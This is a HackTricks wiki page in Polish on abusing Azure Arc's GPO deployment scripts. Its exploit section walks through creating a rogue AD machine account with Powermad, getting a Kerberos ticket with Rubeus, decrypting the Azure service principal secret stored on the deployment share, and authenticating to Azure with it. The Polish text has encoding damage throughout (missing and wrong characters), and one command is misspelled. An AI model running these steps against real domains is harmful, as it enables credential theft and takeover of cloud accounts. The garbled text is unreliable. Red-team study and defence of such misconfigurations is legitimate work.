# Az - Arc vulnerable GPO Deploy Script

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Identifying the Issues

Azure Arc umo偶liwia integracj nowych wewntrznych serwer贸w (serwery doczone do domeny) z Azure Arc za pomoc metody obiekt贸w zasad grupy (GPO). Aby to uatwi, Microsoft dostarcza zestaw narzdzi do wdra偶ania niezbdny do rozpoczcia procedury onboardingu. W pliku ArcEnableServerGroupPolicy.zip znajduj si nastpujce skrypty: DeployGPO.ps1, EnableAzureArc.ps1 i AzureArcDeployment.psm1.

Po uruchomieniu skrypt DeployGPO.ps1 wykonuje nastpujce czynnoci:

1. Tworzy GPO onboardingu serwer贸w Azure Arc w lokalnej domenie.
2. Kopiuje skrypt onboardingu EnableAzureArc.ps1 do wyznaczonego udziau sieciowego utworzonego na potrzeby procesu onboardingu, kt贸ry zawiera r贸wnie偶 pakiet instalacyjny Windows.

Podczas uruchamiania tego skryptu, administratorzy system贸w musz poda dwa g贸wne parametry: **ServicePrincipalId** i **ServicePrincipalClientSecret**. Dodatkowo wymaga innych parametr贸w, takich jak domena, FQDN serwera hostujcego udzia oraz nazwa udziau. Dalsze szczeg贸y, takie jak identyfikator najemcy, grupa zasob贸w i inne niezbdne informacje, musz by r贸wnie偶 dostarczone do skryptu.

Szyfrowany sekret jest generowany w katalogu AzureArcDeploy na okrelonym udziale przy u偶yciu szyfrowania DPAPI-NG. Szyfrowany sekret jest przechowywany w pliku o nazwie encryptedServicePrincipalSecret. Dowody na to mo偶na znale藕 w skrypcie DeployGPO.ps1, gdzie szyfrowanie jest wykonywane przez wywoanie ProtectBase64 z $descriptor i $ServicePrincipalSecret jako wejciami. Deskryptor skada si z SID-贸w grupy komputer贸w domenowych i kontroler贸w domeny, co zapewnia, 偶e ServicePrincipalSecret mo偶e by odszyfrowany tylko przez grupy zabezpiecze kontroler贸w domeny i komputer贸w domenowych, jak zauwa偶ono w komentarzach skryptu.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

Mamy nastpujce warunki:

1. Sukcesywnie przeniknlimy do wewntrznej sieci.
2. Mamy mo偶liwo utworzenia lub przejcia kontroli nad kontem komputera w Active Directory.
3. Odkrylimy udzia sieciowy zawierajcy katalog AzureArcDeploy.

Istnieje kilka metod uzyskania konta maszyny w rodowisku AD. Jedn z najczstszych jest wykorzystanie kwoty konta maszyny. Inn metod jest kompromitacja konta maszyny poprzez podatne ACL lub r贸偶ne inne bdne konfiguracje.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Gdy konto maszyny zostanie uzyskane, mo偶liwe jest uwierzytelnienie si za pomoc tego konta. Mo偶emy u偶y polecenia runas.exe z flag netonly lub u偶y pass-the-ticket z Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Majc TGT dla naszego konta komputera przechowywane w pamici, mo偶emy u偶y nastpujcego skryptu do odszyfrowania sekretu g贸wnego usugi.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternatywnie, mo偶emy u偶y [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

Na tym etapie mo偶emy zebra pozostae informacje potrzebne do poczenia z Azure z pliku ArcInfo.json, kt贸ry jest przechowywany w tym samym udostpnionym zasobie sieciowym co plik encryptedServicePrincipalSecret. Plik ten zawiera szczeg贸y takie jak: TenantId, servicePrincipalClientId, ResourceGroup i inne. Z tymi informacjami mo偶emy u偶y Azure CLI do uwierzytelnienia si jako skompromitowany service principal.

## References

* [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
